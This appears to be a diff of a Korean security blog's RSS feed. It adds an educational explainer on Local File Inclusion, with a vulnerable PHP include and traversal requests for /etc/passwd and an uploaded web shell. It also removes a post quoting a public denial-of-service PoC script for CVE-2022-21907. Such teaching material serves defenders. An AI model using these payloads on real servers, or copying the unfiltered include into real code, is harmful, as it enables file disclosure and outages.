@@ -9,8 +9,36 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Wed, 16 Feb 2022 04:29:10 GMT</pubDate>
+    <pubDate>Wed, 16 Feb 2022 05:26:52 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[해키피디아] LFI(Local File Inclusion)</title>
+      <link>https://hackyboiz.github.io/2022/02/16/y00n_nms/LFI/</link>
+      <guid>https://hackyboiz.github.io/2022/02/16/y00n_nms/LFI/</guid>
+      <pubDate>Wed, 16 Feb 2022 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;File Inclusion &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130; &amp;#xAC12;&amp;#xC744; &amp;#xC815;&amp;#xD655;&amp;#xD558;&amp;#xAC8C; &amp;#xAC8</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>File Inclusion &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xB54C;&#xC5D0; &#xD574;&#xCEE4;&#xAC00; &#xD53C;&#xD574;&#xC790; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xACE0; &#xB54C;&#xB54C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xAC70;&#xB098; &#xC11C;&#xBC84;&#xC5D0; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB610;&#xB294; &#xC6F9;&#xC258;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8; &#xBCC0;&#xC870;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xADF8; &#xC911; LFI(Local File Inclusion)&#xC740; <strong>&#xACF5;&#xACA9; &#xB300;&#xC0C1; &#xC11C;&#xBC84;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;</strong>&#xC744; &#xB178;&#xCD9C;&#xD558;&#xAC70;&#xB098; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, include() &#xC0AC;&#xC6A9; &#xC2DC; &#xC785;&#xB825;&#xC5D0; &#xB300;&#xD574; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xC544; include &#xBB38;&#xC5D0;&#xC11C; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xB2E8;&#xC21C;&#xD55C; &#xC815;&#xBCF4; &#xACF5;&#xAC1C;&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;, &#xB610;&#xB294; XSS(Cross Site Scripting), Directory Traversal &#xB4F1;&#xC758; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">$file = $_GET[&apos;file&apos;];include(&apos;directory/&apos; . $file);</code></pre><p>&#xCD5C;&#xC545;&#xC758; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC758; &#xC608;&#xB85C;, &#xC704;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; GET&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; include&#xAC00; &#xC218;&#xD589;&#xB420; &#xB54C; &#xD574;&#xCEE4;&#xB294; <code>http://example.com/?file=../../uploads/attack.php</code>&#xACFC; &#xAC19;&#xC740; &#xC694;&#xCCAD;&#xC744; &#xD558;&#xC5EC; &#xC6F9;&#xC258;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD56D;&#xC0C1; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC800;&#xC7A5;&#xD558;&#xB354;&#xB77C;&#xB3C4; LFI &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xC11C;&#xBC84;&#xC5D0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB294; &#xBCF4;&#xC7A5;&#xC740; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xD30C;&#xC77C;&#xB97C; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xB354;&#xB77C;&#xB3C4; LFI &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; LFI &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; Directory Traversal(Path Traversal) &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs c">&lt;http:<span class="hljs-comment">//example.com/?file=../../../../etc/passwd&gt;</span></code></pre><br>&#xC704;&#xC758; &#xC608;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xB294; &#xC11C;&#xBC84;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xBAA9;&#xB85D;&#xC774; &#xD3EC;&#xD568;&#xB41C; /etc/passwd &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xD574;&#xCEE4;&#xB294; Directory Traversal &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xB85C;&#xADF8; &#xD30C;&#xC77C;(&#xC608;: Apache access.log &#xB610;&#xB294; error.log), &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xBC0F; &#xAE30;&#xD0C0; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/LFI/">LFI</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2022/02/16/y00n_nms/LFI/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[하루한줄] CVE-2021-43893: Dropping Files on a Domain Controller</title>
@@ -239,9 +267,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
-      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
-      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
       
       
       <comments>https://hackyboiz.github.io/2022/02/08/fabu1ous/2022-02-08/#disqus_thread</comments>
@@ -302,15 +330,15 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
       
       <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
       
-      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
+      <category domain="https://hackyboiz.github.io/tags/integer-underflow/">integer underflow</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/code-execution/">code execution</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/integer-underflow/">integer underflow</category>
       
       
       <comments>https://hackyboiz.github.io/2022/02/05/idioth/2022-02-05/#disqus_thread</comments>
@@ -370,13 +398,13 @@
       
       <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
       
-      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
+      <category domain="https://hackyboiz.github.io/tags/heap-bof/">heap bof</category>
       
       <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
       
-      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
+      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
       
-      <category domain="https://hackyboiz.github.io/tags/heap-bof/">heap bof</category>
+      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
@@ -614,9 +642,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
       <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/microsoft-exchange/">microsoft exchange</category>
       
@@ -656,40 +684,6 @@
       
       
       <comments>https://hackyboiz.github.io/2022/01/21/poosic/ftp/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2022-21907: Windows HTTP 프로토콜 원격 코드 실행 취약점</title>
-      <link>https://hackyboiz.github.io/2022/01/20/l0ch/2022-01-20/</link>
-      <guid>https://hackyboiz.github.io/2022/01/20/l0ch/2022-01-20/</guid>
-      <pubDate>Thu, 20 Jan 2022 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/antx-code/CVE-2022-21907&quot;&gt;https://gith</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/antx-code/CVE-2022-21907">https://github.com/antx-code/CVE-2022-21907</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 Version 1809, 20H2, 21H1</li><li>Windows 11</li><li>Windows Server </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2022&#xB144; 1&#xC6D4; Patch Tuesday&#xC5D0;&#xC11C; Windows&#xC758; http &#xBA54;&#xC2DC;&#xC9C0; &#xD30C;&#xC2F1;&#xACFC; response &#xC0DD;&#xC131;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>HTTP.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58; &#xB9B4;&#xB9AC;&#xC988; &#xC774;&#xD6C4; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC791;&#xB144;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; <strong><a href="https://hackyboiz.github.io/2021/05/19/fabu1ous/2021-05-19/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2021-31166: HTTP.sys &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;</a></strong> &#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xC720;&#xD615;&#xC758; root cause&#xB85C; &#xC545;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2021-31166&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; HTTP request header &#xC911; <code>Accept-Encoding</code> &#xD544;&#xB4DC;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xAC1C;&#xB41C; Denial of Service PoC&#xC758; &#xC77C;&#xBD80;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">host = input(<span class="hljs-string">&quot;Target: &quot;</span>)headers = {    <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&apos;AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;AA&amp;**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,&apos;</span>}<span class="hljs-keyword">try</span>:    response  = urlopen(<span class="hljs-string">f&quot;http://<span class="hljs-subst">{host}</span>&quot;</span>)<span class="hljs-keyword">except</span> (URLError, HTTPError) <span class="hljs-keyword">as</span> e:    <span class="hljs-keyword">pass</span><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">f&quot;http://<span class="hljs-subst">{host}</span> is not DOWN.&quot;</span>)    print(<span class="hljs-string">f&quot;<span class="hljs-subst">{e.__class__}</span>: <span class="hljs-subst">{e}</span>&quot;</span>, file = stderr)    exit(<span class="hljs-number">1</span>)print(<span class="hljs-string">f&quot;http://<span class="hljs-subst">{host}</span> is not UP. Start hacking...&quot;</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        response  = urlopen(Request(<span class="hljs-string">f&quot;http://<span class="hljs-subst">{host}</span>&quot;</span>, headers=headers))    <span class="hljs-keyword">except</span> TimeoutError <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">f&quot;http://<span class="hljs-subst">{host}</span> is not DOWN. <span class="hljs-subst">{host}</span> is vulnerable to CVE-2022-21907.&quot;</span>)    exit(<span class="hljs-number">0</span>)    <span class="hljs-keyword">except</span> (URLError, HTTPError) <span class="hljs-keyword">as</span> e:    <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(<span class="hljs-string">f&quot;<span class="hljs-subst">{e.__class__}</span>: <span class="hljs-subst">{e}</span>&quot;</span>)    print(<span class="hljs-string">f&quot;Payload sent successfully. Try new request...&quot;</span>)</code></pre><blockquote><p>&#xCD9C;&#xCC98; : <a href="https://github.com/mauricelambert/CVE-2022-21907/blob/main/CVE202221907.py">https://github.com/mauricelambert/CVE-2022-21907/blob/main/CVE202221907.py</a></p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC5C6;&#xC774; &#xC545;&#xC131; http &#xD328;&#xD0B7;&#xC744; &#xC11C;&#xBC84;&#xC5D0; &#xBCF4;&#xB0B4;&#xAE30;&#xB9CC; &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4; cvss 9.8&#xC758; &#xB192;&#xC740; &#xC810;&#xC218;&#xB97C; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/http/">http</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2022/01/20/l0ch/2022-01-20/#disqus_thread</comments>
       
     </item>
     
